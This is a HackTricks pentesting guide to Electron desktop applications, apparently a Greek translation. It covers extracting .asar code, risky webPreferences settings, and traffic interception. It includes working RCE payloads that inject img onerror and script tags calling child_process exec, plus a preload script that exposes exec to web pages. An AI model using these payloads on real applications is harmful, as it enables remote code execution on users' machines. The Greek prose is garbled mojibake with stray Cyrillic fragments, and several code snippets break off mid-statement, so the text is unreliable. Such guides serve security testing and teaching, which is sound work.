# Electron Desktop Apps

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Î•Î¹ÏƒÎ±Î³Ï‰Î³Î®

Î¤Î¿ Electron ÏƒÏ…Î½Î´Ï…Î¬Î¶ÎµÎ¹ Î­Î½Î± Ï„Î¿Ï€Î¹ÎºÏŒ backend (Î¼Îµ **NodeJS**) ÎºÎ±Î¹ Î­Î½Î± frontend (**Chromium**), Î±Î½ ÎºÎ±Î¹ Ï„Î¿Ï… Î»ÎµÎ¯Ï€Î¿Ï…Î½ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼Î¿ÏÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Ï‰Î½ ÏƒÏÎ³Ï‡ÏÎ¿Î½Ï‰Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î¬Ï„Ï‰Î½ Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚.

Î£Ï…Î½Î®Î¸Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ electron Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® `.asar`, Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿Î½ ÎµÎ¾Î±Î³Î¬Î³ÎµÏ„Îµ:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Î£Ï„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ± Î¼Î¹Î±Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Electron, Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `packet.json`, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `main.js` ÏŒÏ€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î¿Î¹ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron Î­Ï‡ÎµÎ¹ 2 Ï„ÏÏ€Î¿Ï…Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½:

* ÎšÏÏÎ¹Î± Î”Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± (Î­Ï‡ÎµÎ¹ Ï€Î»Î®ÏÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ NodeJS)
* Î”Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î‘Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚ (Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ NodeJS Î³Î¹Î± Î»ÏŒÎ³Î¿Ï…Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚)

![](<../../../.gitbook/assets/image (182).png>)

ÎœÎ¹Î± **Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚** Î¸Î± ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿ Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Ï†Î¿ÏÏ„ÏÎ½ÎµÎ¹ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î·Ï‚ **Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Î±Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **ÏÏ…Î¸Î¼Î¹ÏƒÏ„Î¿ÏÎ½** ÏƒÏ„Î· **ÎºÏÏÎ¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ main.js. ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î¸Î± **Î±Ï€Î¿Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Electron Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ RCE** Î® Î¬Î»Î»ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î±Î½ Î¿Î¹ **ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ‰ÏƒÏ„Î¬ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½ÎµÏ‚**.

Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® electron **Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· ÏƒÏ…ÏƒÎºÎµÏ…Î®** Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Node APIs Î±Î½ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± Ï„Î¿ Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÎ¹:

* **`nodeIntegration`** - ÎµÎ¯Î½Î±Î¹ `off` Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®. Î‘Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿, ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Ï„Î¿Ï… node Î±Ï€ÏŒ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚.
* **`contextIsolation`** - ÎµÎ¯Î½Î±Î¹ `on` Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®. Î‘Î½ ÎµÎ¯Î½Î±Î¹ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿, Î¿Î¹ ÎºÏÏÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î¿Î¹ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Î±Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î¼Î¿Î½Ï‰Î¼Î­Î½ÎµÏ‚.
* **`preload`** - ÎºÎµÎ½ÏŒ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ÎµÎ¯Î½Î±Î¹ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®. Î˜Î± Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ NodeJS.
* Î•Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· Node ÏƒÎµ Î•ÏÎ³Î¬Ï„ÎµÏ‚
* **`nodeIntegrationInSubframes`** - ÎµÎ¯Î½Î±Î¹ `off` Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®.
* Î‘Î½ Î· **`nodeIntegration`** ÎµÎ¯Î½Î±Î¹ **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·**, Î±Ï…Ï„ÏŒ Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Ï‰Î½ **Node.js APIs** ÏƒÎµ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½ÎµÏ‚ ÏƒÎµ iframes** Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Electron.
* Î‘Î½ Î· **`nodeIntegration`** ÎµÎ¯Î½Î±Î¹ **Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·**, Ï„ÏŒÏ„Îµ Ï„Î± preload Î¸Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½ ÏƒÏ„Î¿ iframe.

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î± **RCE payloads** Î±Ï€ÏŒ [ÎµÎ´Ï](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### Capture traffic

Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· start-main ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ proxy ÏŒÏ€Ï‰Ï‚:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ Electron App Ï„Î¿Ï€Î¹ÎºÎ¬, ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÏ„Îµ Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ± javascript. Î”ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ ÏƒÏ„Î¿:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

Î‘Î½ Ï„Î¿ **nodeIntegration** ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ **on**, Ï„Î¿ JavaScript Î¼Î¹Î±Ï‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ ÎµÏÎºÎ¿Î»Î± Ï„Î¹Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Ï„Î¿Ï… Node.js Î±Ï€Î»Î¬ ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `require()`. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¿ Ï„ÏÏŒÏ€Î¿Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ calc ÏƒÏ„Î± Windows ÎµÎ¯Î½Î±Î¹:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Î¤Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎµÎ¯Î½Î±Î¹ l**oaded Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Î¬Î»Î»Î± ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏƒÏ„Î¿Î½ renderer**, Î­Ï„ÏƒÎ¹ Î­Ï‡ÎµÎ¹ **Î±Ï€ÎµÏÎ¹ÏŒÏÎ¹ÏƒÏ„Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ node-features ÏƒÎµ ÏƒÎµÎ»Î¯Î´ÎµÏ‚:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**Î‘Î½ Ï„Î¿ `contextIsolation` ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿, Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹**
{% endhint %}

## RCE: XSS + contextIsolation

Î— _**contextIsolation**_ ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Ï„Î¿Ï…Ï‚ **Ï‡Ï‰ÏÎ¹ÏƒÏ„Î¿ÏÏ‚ Ï‡ÏÏÎ¿Ï…Ï‚ Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½ Ï„Î·Ï‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±Ï‚ ÎºÎ±Î¹ Ï„Î¿Ï… ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¿Ï ÎºÏÎ´Î¹ÎºÎ± JavaScript Ï„Î¿Ï… Electron** Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· JavaScript ÎºÎ¬Î¸Îµ ÎºÏÎ´Î¹ÎºÎ± Î½Î± Î¼Î·Î½ ÎµÏ€Î·ÏÎµÎ¬Î¶ÎµÎ¹ Î· Î¼Î¯Î± Ï„Î·Î½ Î¬Î»Î»Î·. Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î³Î¹Î± Ï„Î·Î½ ÎµÎ¾Î¬Î»ÎµÎ¹ÏˆÎ· Ï„Î·Ï‚ Ï€Î¹Î¸Î±Î½ÏŒÏ„Î·Ï„Î±Ï‚ RCE.

Î‘Î½ Î¿Î¹ Ï‡ÏÏÎ¿Î¹ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î¼Î¿Î½Ï‰Î¼Î­Î½Î¿Î¹, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î±:

1. Î•ÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ **Ï„Ï…Ï‡Î±Î¯Î¿ JavaScript ÏƒÏ„Î¿Î½ renderer** (XSS Î® Ï€Î»Î¿Î®Î³Î·ÏƒÎ· ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯ÎµÏ‚)
2. **Î‘Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î· Ğ²ÑÑ‚Ñ€Ğ¾Î¼Î­Î½Î· Î¼Î­Î¸Î¿Î´Î¿** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿Î½ preload Î® ÏƒÏ„Î¿Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Electron Î¼Îµ Ï„Î· Î´Î¹ÎºÎ® Ï„Î¿Ï… ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·
3. **Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹** Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ **Î±Î½Ï„Î¹ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚**
4. RCE;

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ 2 Î¼Î­ÏÎ· ÏŒÏ€Î¿Ï… Î¿Î¹ Ğ²ÑÑ‚Ñ€Ğ¾Î¼Î­Î½ÎµÏ‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸Î¿ÏÎ½: Î£Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± preload Î® ÏƒÏ„Î¿Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Electron:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î³ÎµÎ³Î¿Î½ÏŒÏ„Î¿Ï‚ ÎºÎ»Î¹Îº

Î‘Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿Î¯ Ï€Î¿Ï… ÎµÏ†Î±ÏÎ¼ÏŒÎ¶Î¿Î½Ï„Î±Î¹ ÏŒÏ„Î±Î½ ÎºÎ¬Î½ÎµÏ„Îµ ÎºÎ»Î¹Îº ÏƒÎµ Î­Î½Î±Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Ï„Î¿Ï…Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ **ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î¼ÎµÏƒÎ±Î¯Î¿ ÎºÎ»Î¹Îº** Î±Î½Ï„Î¯ Î³Î¹Î± Î­Î½Î± ÎºÎ±Î½Î¿Î½Î¹ÎºÏŒ Î±ÏÎ¹ÏƒÏ„ÎµÏÏŒ ÎºÎ»Î¹Îº.
```javascript
window.addEventListener('click', (e) => {
```
## RCE Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… shell.openExternal

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î¬ Ï„Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±, ÎµÎ»Î­Î³Î¾Ï„Îµ [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ÎºÎ±Î¹ [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

ÎšÎ±Ï„Î¬ Ï„Î·Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î· Î¼Î¹Î±Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Electron desktop, Î· Î´Î¹Î±ÏƒÏ†Î¬Î»Î¹ÏƒÎ· Ï„Ï‰Î½ ÏƒÏ‰ÏƒÏ„ÏÎ½ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Î³Î¹Î± Ï„Î¿ `nodeIntegration` ÎºÎ±Î¹ Ï„Î¿ `contextIsolation` ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î·. Î•Î¯Î½Î±Î¹ Î±Ï€Î¿Î´ÎµÎ´ÎµÎ¹Î³Î¼Î­Î½Î¿ ÏŒÏ„Î¹ Î· **ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± (RCE)** Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Ï€ÎµÎ»Î¬Ï„Î· Ï€Î¿Ï… ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ ÏƒÎµ preload scripts Î® ÏƒÏ„Î¿Î½ ÎµÎ³Î³ÎµÎ½Î® ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Electron Î±Ï€ÏŒ Ï„Î· Î²Î±ÏƒÎ¹ÎºÎ® Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®.

ÎšÎ±Ï„Î¬ Ï„Î·Î½ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ ÏƒÏ…Î½Î´Î­ÏƒÎ¼Î¿Ï…Ï‚ Î® Ï„Î¿ Î¬Î½Î¿Î¹Î³Î¼Î± Î½Î­Ï‰Î½ Ï€Î±ÏÎ±Î¸ÏÏÏ‰Î½, ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Î¹ Î±ÎºÏÎ¿Î±Ï„Î­Ï‚ Î³ÎµÎ³Î¿Î½ÏŒÏ„Ï‰Î½, Î¿Î¹ Î¿Ï€Î¿Î¯Î¿Î¹ ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿Î¹ Î³Î¹Î± Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± ÎºÎ±Î¹ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
